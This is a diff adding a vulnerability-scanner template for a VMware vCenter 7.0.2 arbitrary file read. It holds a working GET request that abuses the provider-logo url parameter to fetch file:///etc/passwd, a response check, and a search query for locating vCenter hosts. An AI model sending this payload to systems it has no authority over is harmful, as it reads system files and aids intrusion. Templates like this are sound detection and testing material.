@@ -1,0 +1,19 @@
+name: VMware vCenter v7.0.2 Arbitrary File Read
+manual: true
+query: app="VMware-vCenter"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"bin:x:")
+expression: r0()
+detail:
+  links:
+  - https://github.com/l0ggg/VMware_vCenter
+  description: VMware vCenter Server is advanced server management software that provides
+    a centralized platform for controlling your VMware vSphere environments, allowing
+    you to automate and deliver a virtual infrastructure across the hybrid cloud with
+    confidence.
+  tags: fileread
